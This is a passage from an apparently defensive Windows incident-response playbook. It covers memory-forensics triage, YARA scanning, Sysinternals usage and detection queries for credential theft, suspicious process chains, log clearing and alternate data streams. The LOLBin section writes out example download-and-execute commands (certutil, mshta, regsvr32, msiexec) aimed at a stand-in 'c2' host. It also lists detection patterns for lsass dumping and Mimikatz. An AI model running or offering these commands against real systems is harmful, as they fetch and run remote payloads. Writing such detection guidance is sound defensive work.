- All URLs/domains present in **confirmed FP PIDs** (AdobeCollabSync enriched alongside TP PIDs will contribute all its Adobe CDN endpoints as if they were adversary C2)
- Certificate validation strings: `ocsp.digicert.com`, `crl.disa.mil`, OCSP/CRL infrastructure found in any HTTPS-capable process
- Browser-cached URLs and XML namespace URIs from working memory of host processes like explorer.exe

Running `Invoke-Eradication.ps1` against a contaminated `IOCs.json` will create outbound firewall blocks and hosts-file sinkhole entries for **legitimate vendor infrastructure**.

**Required step after enrichment, before eradication:**

```powershell
# Inspect what was written to c2_endpoints
(Get-Content .\reports\<host>\IOCs.json | ConvertFrom-Json).c2_endpoints

# For each domain: confirm it is NOT:
#   *.adobe.com / *.acrobat.com / *.adobelogin.com / *.adobe.io    -> AdobeCollabSync FP
#   ocsp.*, crl.*                                                  -> cert validation infrastructure
#   schemas.openxmlformats.org, ns.adobe.com, iptc.org, purl.org   -> XML/metadata namespace URIs
#   www.youtube.com, gitforwindows.org, *.microsoft.com            -> browser cache from host process

# Remove any confirmed-benign entries before running eradication:
$iocs = Get-Content .\reports\<host>\IOCs.json | ConvertFrom-Json
$iocs.c2_endpoints = @($iocs.c2_endpoints | Where-Object { <confirm-adversary-infra-only> })
$iocs | ConvertTo-Json -Depth 10 | Set-Content .\reports\<host>\IOCs.json
```

The same filtering applies to `memory_eradication.implicated_pids` — remove any PID confirmed FP before the eradication loop runs.

---

**What to look for in the AMSI bypass case specifically:**

The enrichment scans ALL private committed readable regions (not just executable ones) for C2 markers. The CoW copy of amsi.dll's patched pages is a private committed region — if the bypass code contains a C2 URL, IP, or encoded config, it will be extracted here even if the YARA rule doesn't have a string for it.

For a shellcode thread, the key enrichment output is:
1. **capa result** on the carved region: does it show `create TCP socket` / `connect to C2` / `inject into process`?
2. **FLOSS decoded strings**: XOR/stack-decoded strings the initial YARA scan missed
3. **IOC sweep**: any IP/domain embedded in the shellcode (beacon config)
4. **Injected thread first-seen**: the thread create time is the implant first-run timestamp, more precise than process create time for host processes like svchost or explorer

**Logic breakdown — per-module TP/FP decision (from `WORKFLOW-INVESTIGATION-WINDOWS.md`):**

| Module signal | True Positive indicators | False Positive indicators | Action |
|---------------|--------------------------|--------------------------|--------|
| **Module 5 — Shellcode Thread** | Thread start in `anon rwx`/`r-x`; no loaded module covers that address | Thread in JIT region (CLR/.NET/V8/Acrobat); annotated JIT-consistent in findings; **VAD at thread start is unmapped** (DLL unloaded after thread was created — common in explorer.exe shell extensions, async COM handlers) | JIT annotation does NOT clear alone — corroborate with YARA hit, ntdll stub patch, cross-process thread creation, or Module 3 private exec VAD. **Key step: run `vad_query.py <aff4> <pid> <hex_addr>` to check VAD backing: unmapped = unloaded DLL (FP); `anon rwx` = TP; `image` type = DLL not in PEB module list (also FP)** |
| **Module 12 — ntdll Stub Integrity** | Preamble replaced with JMP or NOP; only 1-2 processes patched (selective) | Same preamble replaced across ALL processes | If all processes share the same patch = EDR hook (normal); if only attacker-adjacent PIDs = attacker hooking |
| **Module 13 — Dormant Beacon / W^X** | CV < 15% (highly uniform byte distribution) AND `AdjAnonExec=True` AND high entropy | Non-uniform (CV > 25%), `AdjAnonExec=False`, region is known JIT heap | Both `AdjAnonExec=True` AND uniform distribution required for TP; either alone is insufficient |
| **Module 14 — Thread-pool / Ekko** | ntdll thread-pool workers co-located with Module 13 beacon PIDs | Thread-pool workers in processes with no other injection evidence | Ekko/Foliage pattern requires Module 13 corroboration — don't escalate Module 14 standalone |
| **YARA + Module 3 (injected exec region)** | Named family rule (APT/malware-specific) in `anon` unbacked memory | Generic rule (LOLBin_BITS_Drop) in file-backed signed DLL | Named family rule in anonymous exec = TP regardless of other signals; generic rule + file-backed = FP graze |
| **PEB cmdline anomaly** | PID still running; buffer pointer outside process heap | PID no longer exists at analysis time | Timing artifact if process exited — check `Get-Process -Id <PID>`; close as FP if not found |

**Binary Ninja carve (for deeper static analysis):**

The YARA worker writes carved regions to `tools/binja/data/<id>/` automatically when a YARA hit occurs in a private+exec VAD. Each carve is a raw `.bin` + `.json` sidecar:

```json
{
  "carved_from": "<hostname>.aff4",
  "pid": 1234,
  "process": "<process_name>",
  "base_address": "0x<address>",
  "injected": true,
  "matched_rules": ["<rule_name>"],
  "arch_hint": "x86_64",
  "load_as": "raw",
  "protection": "anon rwx",
  "note": "Private anon exec VAD — true-positive injection region; load in Binary Ninja at base_address"
}
```

Load the `.bin` in Binary Ninja at `base_address` as `x86_64 raw` to disassemble/decompile the shellcode.

---

## 12 — Direct YARA and mwcp Scan (Follow-On Investigation)

When investigation leads point to a specific file that was NOT flagged during the automated hunt
— for example, a suspicious binary retrieved from a network share, a file in an unusual directory,
or an artifact recovered from a carved memory region — run YARA and DC3-MWCP against it directly
without re-running the full collection.

```powershell
# Scan a SINGLE SPECIFIC FILE with YARA + mwcp (most common follow-on case)
# Requires: -IncludeYaraRules, -IncludeMWCP staging
powershell.exe -ExecutionPolicy Bypass -File ".\playbooks\windows\threat_hunting\dev\Release\EDR_Toolkit_Deploy.ps1" `
    -FilePath "C:\path\to\suspect.exe" `
    -ScanYara -ScanMWCP `
    -ReportPath ".\reports\<host>" -Quiet

# Scan a DIRECTORY (non-recursive, file-by-file log stamps)
powershell.exe -ExecutionPolicy Bypass -File ".\playbooks\windows\threat_hunting\dev\Release\EDR_Toolkit_Deploy.ps1" `
    -FilePath "C:\path\to\staging_folder" `
    -ScanYara -ScanMWCP `
    -ReportPath ".\reports\<host>" -Quiet

# Scan a DIRECTORY RECURSIVELY (full subdirectory crawl)
powershell.exe -ExecutionPolicy Bypass -File ".\playbooks\windows\threat_hunting\dev\Release\EDR_Toolkit_Deploy.ps1" `
    -FilePath "C:\path\to\folder" -Recursive `
    -ScanYara -ScanMWCP `
    -ReportPath ".\reports\<host>" -Quiet
```

Both `-ScanYara` and `-ScanMWCP` use `-FilePath` as the target. Per-file log stamps confirm
which file was scanned and whether anything was found:
- `[*] YARA [1/3] scanning: [file] suspect.exe`
- `    [!] MATCH: CobaltStrike_Beacon on suspect.exe` — YARA hit with rule name
- `    [+] RESULT: clean -- no YARA matches` — confirmed clean
- `[*] mwcp [1/3] scanning: suspect.exe`
- `    [!] RESULT: config extracted -- Mutexes: 1BA6BD98D9 | C2: 1.2.3.4:4444` — mwcp config found
- `    [+] RESULT: clean -- no family parser matched` — no known family config

**When to use this:**
- A memory enrichment finding includes a dropped file path — scan that path directly
- An OSINT pivot returns a hash that matches something in the environment — locate and scan the file
- A process handles file shows a suspicious open file handle — scan that file
- Lateral movement evidence points to a file on a share — pull and scan before touching the host

**What it produces:**
Findings roll into the standard EDR report (`EDR_Report_*.json`) as `YARA Match` and
`mwcp Config Extraction` entries. Combine with `Add-ManualFinding.ps1` (Section 19b) to feed
confirmed mwcp-extracted mutexes and C2 into `IOCs.json` for the eradication pipeline.

---

## 13 — Staged Tools Quick Reference

All tools are in `tools\`. Run from the toolkit root or copy to the target host.

```powershell
$T = "e:\IR_Toolkit\tools"   # adjust to your deployment path
$py = ".\tools\memprocfs\python\python.exe"

# --- Memory image VAD lookup (AFF4 - use vmmpyc, NOT vol.exe which does not support AFF4) ---
# Resolve which VAD covers a thread start address (Module 5 FP triage):
& $py .\playbooks\windows\threat_hunting\vad_query.py "<image.aff4>" <pid> <hex_address>
# Output: type=image (DLL, FP), type=private (anon, potential TP), or "no VAD" (unloaded DLL, FP)

# --- Process and DLL inspection ---
# Full handle list for a PID (files, registry, mutexes, pipes, threads, sections)
& "$T\handle64.exe" -p <PID> -accepteula

# All DLLs loaded by a PID (path + version)
& "$T\Listdlls64.exe" -p <PID> -accepteula

# All DLLs loaded by a PID that are NOT signed (quick unsigned-DLL sweep)
& "$T\sigcheck64.exe" -accepteula -nobanner -e -u <path_to_exe_or_dll>
# On a whole directory:
& "$T\sigcheck64.exe" -accepteula -nobanner -s -u C:\Windows\System32

# Strings from a file (or memory dump) - both ASCII and Unicode
& "$T\strings64.exe" -accepteula -n 8 <file_or_dump>
# Pipe into Select-String for IOC scanning:
& "$T\strings64.exe" -accepteula <file> | Select-String -Pattern '(?i)(http|cmd|powershell|\\temp\\|\\public\\)'

# --- Network ---
# Live TCP/UDP connections with PID and executable path
& "$T\tcpvcon64.exe" -accepteula -a -n

# --- Autoruns ---
# Everything that runs at startup (registry + tasks + services + drivers + ...)
& "$T\autorunsc64.exe" -accepteula -nobanner -a * -c | ConvertFrom-Csv | Format-Table -Wrap
# Unsigned-only (common after tool drops or DLL hijack):
& "$T\autorunsc64.exe" -accepteula -nobanner -a * -c -u | ConvertFrom-Csv | Format-Table -Wrap
# VirusTotal check (requires internet):
& "$T\autorunsc64.exe" -accepteula -nobanner -a * -v -c | ConvertFrom-Csv | Where-Object {$_.VT -ne '0'}

# --- Process list snapshot ---
& "$T\pslist64.exe" -accepteula -t   # tree view

# --- Memory dump (for offline analysis with vol.exe) ---
# Full memory dump of one process:
& "$T\procdump64.exe" -accepteula -ma <PID> <output.dmp>
# Full system memory dump (needs admin, produces large file):
& "$T\go-winpmem.exe" -o C:\captures\memory_<hostname>.aff4

# --- Logged-on users ---
& "$T\PsLoggedon64.exe" -accepteula
```

**Staged playbooks that wrap these tools:**

```powershell
# Persistence snapshot (registry Run, tasks, services, drivers, startup folders, LSA)
.\playbooks\windows\threat_hunting\Get-PersistenceSnapshot.ps1 -OutputDir reports\<host>\

# Event log analysis (filters 4688, 4698, 7045, 1102, 4624, 4625, 4720, etc.)
# Note: requires -InputDir pointing to where .evtx files were collected, and -OutputDir
.\playbooks\windows\threat_hunting\Invoke-EventLogAnalysis.ps1 -InputDir reports\<host>\Persistence -OutputDir reports\<host>\

# Remote access triage (RDP, WinRM, TeamViewer, AnyDesk, SSH indicators)
.\playbooks\windows\threat_hunting\Get-RemoteAccessTriage.ps1 -OutputDir reports\<host>\

# Amcache parser (first-run timestamps for executables)
# Note: requires backup privilege for live system Amcache.hve (admin) or -InputDir pointing to collected copy
.\playbooks\windows\threat_hunting\Invoke-AmcacheParser.ps1 -InputDir reports\<host>\ -OutputDir reports\<host>\

# USB device history (for RAM<->USB entry-vector correlation)
.\playbooks\windows\threat_hunting\Get-USBDeviceHistory.ps1 -OutputDir reports\<host>\
```

**Playbook output logic:**

| Playbook output | What to look for | Where to go next |
|----------------|-----------------|-----------------|
| Persistence_Findings: "Netsh Helper DLL (unresolved: xxx.dll)" | If all entries are standard Windows netsh helper names (ifmon, rasmontr, dhcpcmonitor, nshhttp, etc.) with no full path — this is a systematic FP from the adjudicator; all Windows systems have these | Only investigate if the target name is NOT a known Windows netsh DLL |
| Persistence_Findings: Run key → Temp/AppData path | Suspicious — legitimate software does not auto-start from temp dirs | Inspect binary; Section 19 signature check |
| RemoteAccess_Findings: LOLBin Execution — pwsh with `-ExecutionPolicy Bypass` | Check the full command line; VS Code, developer tools, and admin scripts legitimately use this flag | FP if path is VS Code, IR toolkit, PowerShell ISE; suspicious if path is Temp/unknown |
| RemoteAccess_Findings: Browser Artifact | Collected for review; low-severity baseline | Inspect browser history only if you have a suspected download-and-execute timeline to correlate |
| Amcache: "amcache_parsed.csv not found" | Amcache.hve is locked on live system (requires backup privilege to shadow-copy) | Run as admin via Get-PersistenceSnapshot.ps1 which collects the hive, then re-run Invoke-AmcacheParser |

---

## 13 — Credential Access Indicators

Common credential theft leaves observable traces even without catching the dump in flight.

```powershell
# LSASS access: check for processes with PROCESS_VM_READ on lsass
# (requires admin; Event 4656/4663 with ObjectName=lsass.exe if object access auditing is on)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=@(4656,4663)} -MaxEvents 500 |
    Where-Object { $_.Message -match 'lsass' } |
    ForEach-Object { "[$($_.TimeCreated)] $($_.Message -replace '\s+',' ' | %{$_.Substring(0,[Math]::Min(400,$_.Length))})" }

# Procdump of lsass (attacker use): look for procdump/taskmgr/comsvcs.dll minidump
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 1000 |
    Where-Object { $_.Message -match '(?i)(procdump|comsvcs|minidump|ProcDump)' } |
    ForEach-Object { $_.Message -replace '\s+',' ' }

# SAM/NTDS.dit access (offline extraction via VSS or reg save)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4663} -MaxEvents 200 |
    Where-Object { $_.Message -match '(?i)(sam|ntds\.dit|system hive|\\windows\\ntds)' } |
    ForEach-Object { $_.Message }

# Mimikatz indicator strings in process memory (via strings on a procdump or YARA)
& "$T\strings64.exe" -accepteula lsass.dmp |
    Select-String -Pattern '(?i)(sekurlsa|wdigest|logonpasswords|privilege::debug|lsadump)'

# WDigest plaintext credential re-enable (attacker sets UseLogonCredential=1)
Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' |
    Select-Object UseLogonCredential
# 1 = plaintext creds in memory (attacker-modified); should be 0 or absent

# DPAPI master key access / credential file access
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4663} -MaxEvents 200 |
    Where-Object { $_.Message -match '(?i)(Protect|Unprotect|masterkey|credman|vault)' } |
    ForEach-Object { $_.Message }

# Check for credential files in user profile (may be copied/exfiltrated)
Get-ChildItem "$env:APPDATA\Microsoft\Credentials", "$env:LOCALAPPDATA\Microsoft\Credentials",
    "$env:APPDATA\Microsoft\Protect" -Recurse -Force -ErrorAction SilentlyContinue |
    Select-Object FullName, LastWriteTime, Length
```

**Logic breakdown — credential access investigation:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| 4656/4663 events: known EDR or Defender process accessing lsass | EDR's own credential-protection inspection | Close as FP if `CallerProcessName` is a known security product binary |
| 4656/4663 events: unknown user-space process accessing lsass | Credential dump attempt via handle | Identify the process (Section 1); check for procdump/comsvcs cmdline in 4688 |
| procdump / comsvcs.dll in 4688 with lsass target | Confirmed credential dump | Escalate; check Section 7 for exfil connections shortly after the dump |
| WDigest `UseLogonCredential = 1` | Attacker forced plaintext creds into memory | Assume all credentials logged on in that period are compromised; force password resets |
| `sekurlsa` strings in a memory region | Mimikatz or derivative ran in that process | Correlate with AMSI bypass (Section 4); AMSI bypass + sekurlsa strings = confirmed use |
| SAM/NTDS.dit access via VSS | Offline hash extraction — all local and domain hashes at risk | Assume full domain compromise if on DC; force KRBTGT double-reset |
| No 4656/4663 events at all | Object access auditing may not be enabled | `auditpol /get /subcategory:"Kernel Object"` — if Not Configured, note the coverage gap |

**Indicators of compromise for this vector:**

| Indicator | Technique | Notes |
|-----------|-----------|-------|
| `procdump.exe` / `comsvcs.dll` in 4688 with lsass target | T1003.001 | Procdump or `rundll32 comsvcs.dll,MiniDump` |
| `reg save HKLM\SAM` / `reg save HKLM\SYSTEM` in cmdline | T1003.002 | SAM offline extraction |
| `ntdsutil.exe` / `vssadmin create shadow` | T1003.003 | NTDS.dit via VSS |
| `WDigest UseLogonCredential=1` | T1556.001 | Forces plaintext creds into memory |
| `sekurlsa` strings in memory | T1003.001 | Mimikatz or Mimikatz-derived tool |
| Unfamiliar process with PROCESS_VM_READ on lsass | T1003.001 | Handle-based dump |

---

## 14 — Suspicious Parent-Child Chains

The most reliable high-fidelity detection in process telemetry. Many lateral movement and execution techniques produce a parent-child pair that should never occur normally.

```powershell
# Get full process tree with parent paths
Get-CimInstance Win32_Process | ForEach-Object {
    $parent = Get-CimInstance Win32_Process -Filter "ProcessId=$($_.ParentProcessId)" -ErrorAction SilentlyContinue
    [pscustomobject]@{
        PID        = $_.ProcessId
        Name       = $_.Name
        PPID       = $_.ParentProcessId
        ParentName = $parent.Name
        ParentPath = $parent.ExecutablePath
        CmdLine    = $_.CommandLine
    }
} | Sort-Object PPID, PID | Format-Table -Wrap

# Flag known-suspicious parent-child pairs
$suspicious = @(
    @{Parent='winword.exe|excel.exe|powerpnt.exe|mspub.exe'; Child='cmd.exe|powershell.exe|pwsh.exe|wscript.exe|cscript.exe|mshta.exe|regsvr32.exe|rundll32.exe|certutil.exe'},
    @{Parent='outlook.exe'; Child='cmd.exe|powershell.exe|pwsh.exe|wscript.exe|mshta.exe'},
    @{Parent='chrome.exe|firefox.exe|msedge.exe|iexplore.exe'; Child='cmd.exe|powershell.exe|pwsh.exe|wscript.exe|mshta.exe|regsvr32.exe'},
    @{Parent='svchost.exe'; Child='cmd.exe|powershell.exe|pwsh.exe|wscript.exe|mshta.exe|cscript.exe'},
    @{Parent='lsass.exe|services.exe|wininit.exe'; Child='cmd.exe|powershell.exe|pwsh.exe'},
    @{Parent='explorer.exe'; Child='powershell.exe|pwsh.exe|wscript.exe|mshta.exe|regsvr32.exe|certutil.exe|bitsadmin.exe'}
)
Get-CimInstance Win32_Process | ForEach-Object {
    $proc = $_
    $parentProc = Get-CimInstance Win32_Process -Filter "ProcessId=$($proc.ParentProcessId)" -ErrorAction SilentlyContinue
    foreach ($rule in $suspicious) {
        if ($parentProc.Name -match $rule.Parent -and $proc.Name -match $rule.Child) {
            Write-Host "SUSPICIOUS: $($parentProc.Name) ($($proc.ParentProcessId)) -> $($proc.Name) ($($proc.ProcessId))"
            Write-Host "  CmdLine: $($proc.CommandLine)"
        }
    }
}
```

**Logic breakdown — parent-child investigation:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| Office product spawning cmd / powershell | Macro dropper (T1566.001) — document execution | Identify the triggering document in `%APPDATA%\Microsoft\Office\Recent`; check Section 15 Amcache for when it appeared |
| svchost spawning interactive shell | Service context execution anomaly — injection or WMI consumer | Check Section 3 WMI subscriptions; corroborate PID service (Section 1) |
| lsass / services / wininit spawning any child | Process hollowing or serious injection — these processes never spawn shells normally | Immediate escalation; Section 10 memory carve; Section 20 |
| wmiprvse spawning cmd / powershell | WMI lateral movement (T1047) | Check Section 3; check 4648 events for explicit credentials used |
| Parent process ID not found (orphaned) | Parent exited after creating the child — normal for userinit→explorer; suspicious otherwise | For explorer: FP. For all others: check Section 5 shellcode thread on child; check Section 16 4688 event for original parent |
| Child cmdline contains `-enc` / `-w hidden` / download cradle | Command-line obfuscation or download-execute pattern | Extract and decode the encoded command (base64 decode the `-enc` value); pivot to Section 10/11 if payload is found |
| All flagged pairs are known developer tools (Code.exe -> pwsh) | VS Code terminal / PowerShell Editor Services workflow | FP — close; VS Code PSES legitimately spawns pwsh with `-ExecutionPolicy Bypass` |
| mshta / wscript / cscript spawning powershell | Script dropper pattern (T1059.005) | Extract the script; check WMI subscriptions (Section 3); Section 15 for when script arrived |

**Reference table of high-signal parent-child pairs:**

| Parent | Child | ATT&CK | Why suspicious |
|--------|-------|--------|----------------|
| winword / excel / powerpnt | cmd, powershell, wscript | T1566.001 | Macro dropper |
| outlook | cmd, powershell, mshta | T1566.001 | Email attachment dropper |
| svchost | interactive shells | T1055 | Service process spawning shells = injection |
| lsass | anything | T1055.012 | lsass should never spawn children |
| msiexec | cmd / powershell (with URL) | T1218.007 | MSI-based download execution |
| regsvr32 | network connections | T1218.010 | Squiblydoo (COM script via HTTP) |
| mshta | cmd / powershell | T1218.005 | HTA dropper |
| explorer | powershell with `-enc` or `-NoP` | T1059.001 | User-context shellcode dropped script |
| wmiprvse | cmd / powershell | T1047 | WMI lateral movement |
| cscript / wscript | powershell / cmd | T1059.005 | VBS dropper |

---

## 15 — First-Run Evidence (Amcache + Prefetch)

When a binary was run but the process is gone, Amcache and Prefetch give the first-run timestamp.

```powershell
# Amcache: registry-based first-run timestamps for executables
# Staged parser in the toolkit:
.\playbooks\windows\threat_hunting\Invoke-AmcacheParser.ps1 -InputDir reports\<host>\ -OutputDir reports\<host>\
# Output: Amcache_<ts>.json + Amcache_<ts>.md

# Manual Amcache read (hive at C:\Windows\appcompat\Programs\Amcache.hve):
# Export the hive, then parse with reg.exe or the staged parser
reg export HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings . 2>$null  # BAM: last-run only

# Prefetch: C:\Windows\Prefetch\<EXE>-<HASH>.pf (8 timestamps: last run + 7 previous)
# Read prefetch files (no special parser needed for filenames / dates):
Get-ChildItem 'C:\Windows\Prefetch' -Filter '*.pf' | Sort-Object LastWriteTime -Descending |
    Select-Object -First 30 Name, LastWriteTime | Format-Table

# Look for suspicious executables in prefetch:
Get-ChildItem 'C:\Windows\Prefetch' | Where-Object {
    $_.Name -match '(?i)(mimikatz|procdump|psexec|cobalt|meterpreter|beacon|wce|fgdump|pwdump|lsass)'
} | Select-Object Name, LastWriteTime

# Shimcache (AppCompatCache): last-modified time for executables (NOT run time — existence only)
# Requires offline parsing of SYSTEM hive; use vol.exe shimcachemem or the staged parser

# BAM (Background Activity Monitor): last execution time per user (Win10+)
Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\*' -ErrorAction SilentlyContinue |
    Select-Object PSChildName, * | ForEach-Object { $_ }
```

**Logic breakdown — first-run evidence:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| Known attacker tool name in Prefetch (mimikatz, procdump, psexec, cobalt, beacon...) | Binary was executed on this host | Extract first-run timestamp; correlate with logon events (Section 16 4624/4648); escalate |
| Suspicious binary in Prefetch from `AppData\Roaming` / `Temp` / `Public` path | User-written or downloaded dropper ran | Extract path from `.pf` contents (requires parser); correlate with browser history (Section 12 remote access playbook) |
| Prefetch empty (0 .pf files, EnablePrefetcher=3) | Cleaning tool may have run, OR system is VM/NVMe with ReadyBoot disabled | Check Run keys for CCleaner, BleachBit; check Section 8 persistence; NVMe with SSD optimisation can legitimately have empty Prefetch |
| Amcache entry: SHA1 hash present but file no longer on disk | Binary was deleted after execution (anti-forensic) | SHA1 still searchable on VirusTotal; submit for reputation check |
| BAM last-run time for a suspicious binary | Last time that binary ran, per-user | Correlate with logon events (Section 16); confirms interactive execution vs. service execution |
| Shimcache entry for binary NOT also in Amcache | Binary existed on disk but may not have run | Lower confidence; treat as "was present" not "was executed"; still pivot on hash if available |
| Amcache entry: publisher is empty, SHA1 is random-looking | Binary was packed/obfuscated or self-signed | Submit SHA1 to VT; Section 19 signature check on any copy still on disk |

**When to use each:**

| Source | Tells you | Doesn't tell you |
|--------|-----------|-----------------|
| Prefetch | Last 8 run times, files loaded | Path (just the exe name), whether it succeeded |
| Amcache | First time a binary appeared on the system (install/copy time) | Whether it ran |
| BAM | Last run time per user (registry) | Command line arguments |
| Shimcache | Binary existed on disk at that path | Whether it ran (shimcache records ARE/AREN'T entries) |

---

## 16 — Event Log Health + Clearing Indicators

An attacker who clears logs is destroying evidence — but the clearing event itself is still logged.

```powershell
# Event 1102: Security log cleared (Security log - admin required)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} -MaxEvents 50 -ErrorAction SilentlyContinue |
    ForEach-Object { "[$($_.TimeCreated)] SECURITY LOG CLEARED: $($_.Message -replace '\s+',' ')" }

# Event 104: System log cleared (System log)
Get-WinEvent -FilterHashtable @{LogName='System'; Id=104} -MaxEvents 50 -ErrorAction SilentlyContinue |
    ForEach-Object { "[$($_.TimeCreated)] SYSTEM LOG CLEARED: $($_.Message -replace '\s+',' ')" }

# Event 4719: Audit policy changed (Security log)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4719} -MaxEvents 50 -ErrorAction SilentlyContinue |
    ForEach-Object { $_.Message -replace '\s+',' ' }

# Check for timestamp gaps (long gaps in a normally-busy log = possible clearing or tampering)
$evts = Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime=(Get-Date).AddDays(-7)} -MaxEvents 2000
$sorted = $evts | Sort-Object TimeCreated
for ($i=1; $i -lt $sorted.Count; $i++) {
    $gap = ($sorted[$i].TimeCreated - $sorted[$i-1].TimeCreated).TotalHours
    if ($gap -gt 4) {
        Write-Host "GAP: $([math]::Round($gap,1))h between $($sorted[$i-1].TimeCreated) and $($sorted[$i].TimeCreated)"
    }
}

# Check current log sizes vs maximum (truncation can mask clearing)
Get-WinEvent -ListLog 'Security','System','Application','Microsoft-Windows-PowerShell/Operational' |
    Select-Object LogName, RecordCount, FileSize, MaximumSizeInBytes, IsEnabled |
    Format-Table -Wrap

# wevtutil: check log retention policy (AutoBackup vs Overwrite)
wevtutil gl Security | Select-String -Pattern '(retention|autoBackup|maxSize)'
```

**Logic breakdown — event log health:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| Event 1102 or 104 found | Attacker (or admin) cleared a log — treat the preceding gap period as high-confidence compromise window | Record the clearing timestamp; correlate logon events (4624/4648) around that time; assume evidence in that window is lost |
| Event 4719: audit policy subcategory changed | Attacker may have disabled logging before their actions | Check which subcategory was disabled (e.g. "Process Creation"); if disabled then re-enabled, events during the gap are gone |
| Timestamp gap > 4h in Security log | Possible clearing, excessive log rollover, or host offline | Check for Event 1102 in that window; cross-reference System log for host-offline evidence (System log Event 6008 = unexpected shutdown) |
| Log `MaximumSizeInBytes` < 8MB for Security log | Log rolls over quickly — retention measured in hours not days | Note for case timeline; check SIEM for preserved copies; this is a configuration weakness, not necessarily attacker action |
| `RecordCount` near 0 in Security log with MaxSize configured | Log was recently cleared or the host was just rebooted with no audit activity | Check Event 1102; cross-reference with Section 15 Amcache/Prefetch for activity evidence independent of event log |
| PowerShell Operational log missing or 0 records | ScriptBlock Logging may be disabled | `HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging` = 0 or absent = disabled |
| AMSI-related strings in 4104 Script Block events | An AMSI bypass attempt was logged (bypass may have partially failed) | Extract the script block; pivot to Section 4 (AMSI investigation); capture the bypass string |

**Key events to check on every investigation:**

| Event ID | Log | Meaning |
|----------|-----|---------|
| 1102 | Security | Security log manually cleared — high fidelity attacker indicator |
| 104 | System | System log manually cleared |
| 4719 | Security | Audit policy changed (attacker disabling logging) |
| 4624 | Security | Successful logon — look for Type 3 (network) or Type 10 (remote interactive) at odd hours |
| 4625 | Security | Failed logon — burst = password spray or brute force |
| 4648 | Security | Logon with explicit credentials (runas / pass-the-hash indicator) |
| 4697 | Security | Service installed (persistence) |
| 7045 | System | New service installed |
| 4698 | Security | Scheduled task created |
| 4720 | Security | User account created |
| 4728/4732/4756 | Security | User added to privileged group (Domain/Local Admins) |

---

## 17 — Alternate Data Streams (ADS)

ADS hide data or payloads as named streams on NTFS files. Common use: Zone.Identifier (legit download marking) vs. hidden payload stream.

```powershell
# List all ADS on files in a directory (recurse) — suspicious if stream name is not Zone.Identifier
Get-ChildItem -Recurse -Force <path> | ForEach-Object {
    $streams = Get-Item $_.FullName -Stream * -ErrorAction SilentlyContinue |
        Where-Object { $_.Stream -ne ':$DATA' -and $_.Stream -ne 'Zone.Identifier' }
    if ($streams) {
        Write-Host "ADS found: $($_.FullName)"
        $streams | ForEach-Object { Write-Host "  Stream: $($_.Stream)  Size: $($_.Length)" }
    }
}

# Read a specific ADS
Get-Content '<file>:streamname'

# Delete a specific ADS (if confirmed malicious)
Remove-Item '<file>' -Stream 'streamname'

# Zone.Identifier stream tells you how a file arrived (internet download = ZoneId=3)
Get-Content '<file>:Zone.Identifier'
# ZoneId=3 = Internet (downloaded) — useful for attributing download source

# Sysinternals streams.exe for a comprehensive scan:
& "$T\strings64.exe" -accepteula -s <directory>   # strings also recurses ADS with -s
# or use the EDR's built-in ADS scanner (playbooks\windows\threat_hunting\dev\src\05_File_And_ADS_Hunt.ps1)
```

**Logic breakdown — ADS investigation:**

| Result | What it means | Where to go next |
|--------|--------------|-----------------|
| Stream named `Zone.Identifier` only | Standard Windows download tracking — legitimate | Optionally read `ZoneId` value: 3 = internet (downloaded), 2 = intranet, 0 = local |
| ADS with name other than `Zone.Identifier` on a system binary | Payload hidden in NTFS stream | Extract with `Get-Content '<file>:streamname'`; check for MZ header; Section 19 signature on extracted content |
| ADS content starts with `MZ` (`4D 5A`) | Embedded PE (executable) hidden in stream | Extract the stream bytes; hash and submit to VT; Section 10 if process based on this PE is running |
| ADS on `.txt` / `.docx` / `.pdf` in Temp or AppData | Data staging or exfiltration preparation | Check file access timestamps; correlate with outbound connections (Section 7) around that time |
| `Zone.Identifier` absent on a binary the user claims to have downloaded | File may have been copied from USB or network share (bypasses Mark-of-the-Web) | Correlate with USB device history; check Section 15 Amcache for path and first-seen |
| Large ADS (> 100KB) on an otherwise-small file | Significant hidden data — may be staged payload or exfil data | Extract and check entropy; high entropy in large stream = encrypted payload or compressed data |

**High-signal ADS patterns:**

| Pattern | Concern |
|---------|---------|
| `.exe:Zone.Identifier` absent on a claimed-downloaded file | May have been copied from USB/network share (bypasses Mark-of-the-Web) |
| Any stream named other than `Zone.Identifier` on a system binary | Hidden payload |
| ADS with executable content (`MZ` header) | Embedded PE — extract and analyze |
| ADS on a `.txt` or `.docx` in Temp | Data staging / exfil prep |

---

## 18 — LOLBin Abuse Patterns

Living-off-the-land binaries leave characteristic command lines. Look for these in Event 4688 cmdlines or EDR telemetry.

```powershell
# Certutil: decode/download (most abused LOLBin)
# Decode: certutil -decode base64file output.exe
# Download: certutil -urlcache -split -f http://c2/payload output.exe
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 1000 |
    Where-Object {$_.Message -match '(?i)certutil.*(decode|urlcache|split|-f\s+http)'} |
    ForEach-Object {$_.Message -replace '\s+',' '}

# Mshta: HTA execution (remote or local)
# mshta.exe http://c2/malware.hta
# mshta.exe vbscript:Execute(...)

# Regsvr32: COM scriptlet execution (Squiblydoo)
# regsvr32.exe /s /n /u /i:http://c2/payload.sct scrobj.dll

# Rundll32: DLL execution / COM scriptlet
# rundll32.exe javascript:"\..\mshtml,RunHTMLApplication "
# rundll32.exe C:\Windows\Temp\evil.dll,EntryPoint

# MSIEXEC: MSI dropper
# msiexec.exe /i http://c2/payload.msi /quiet

# ODBCCONF: DLL registration bypass
# odbcconf.exe /s /a {REGSVR c:\evil.dll}

# WMIC: remote execution / process creation
# wmic process call create "cmd.exe /c ..."
# wmic /node:targethost process call create "..."

